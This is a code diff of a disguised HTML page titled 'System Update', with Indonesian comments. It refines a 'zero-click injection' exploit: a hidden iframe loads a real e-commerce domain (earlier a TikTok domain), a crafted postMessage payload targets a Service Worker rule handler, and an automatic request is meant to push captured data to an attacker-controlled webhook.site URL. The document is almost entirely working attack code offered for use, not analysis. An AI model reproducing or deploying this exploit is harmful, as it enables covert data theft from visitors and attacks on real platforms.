@@ -2,20 +2,21 @@
 <html>
 <head><title>System Update</title></head>
 <body>
-    <iframe id="target" src="https://mcs-sg.tiktokv.com/v1/list" style="display:none;"></iframe>
+    <iframe id="target" src="https://shop-id.tokopedia.com/robots.txt" style="display:none;"></iframe>
 
     <script>
         const targetFrame = document.getElementById('target');
-        const webhook = "https://webhook.site/https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
+        const webhook = "https://webhook.site/ID_LU_DI_SINI";
 
         function sendExploit() {
             console.log("Attempting Zero-Click Injection...");
             
+            // Payload sesuai pns_logic.js: source harus 'main_thread'
             const payload = {
-                source: "main_thread", // Sesuai pns_logic.js baris awal
+                source: "main_thread", 
                 eventName: "network_rule",
                 data: [{
-                    ruleName: "zero_click_pwn",
+                    ruleName: "zero_click_bypass",
                     global: true,
                     conditions: [],
                     handlers: [{
@@ -27,22 +28,19 @@
                 }]
             };
 
-            // Kirim pesan ke semua window yang terbuka (broadcast style)
+            // Mengirim postMessage ke Iframe target
             targetFrame.contentWindow.postMessage(payload, "*");
-            
-            // Tambahan: Kirim ke opener juga kalau ada
-            if (window.opener) {
-                window.opener.postMessage(payload, "*");
-            }
         }
 
         targetFrame.onload = function() {
-            console.log("Iframe loaded successfully!");
+            console.log("Target successfully loaded (Status 200).");
+            // Jeda 2 detik agar Service Worker siap menerima pesan
             setTimeout(sendExploit, 2000);
             
-            // Trigger fetch otomatis buat aktivasi rules
+            // Trigger otomatis: Memaksa fetch agar SW mengirim data ke Webhook
             setTimeout(() => {
-                fetch("https://mcs-sg.tiktokv.com/v1/list", {mode: 'no-cors'});
+                const img = new Image();
+                img.src = "https://shop-id.tokopedia.com/generate_204?trigger=" + Math.random();
             }, 4000);
         };
     </script>
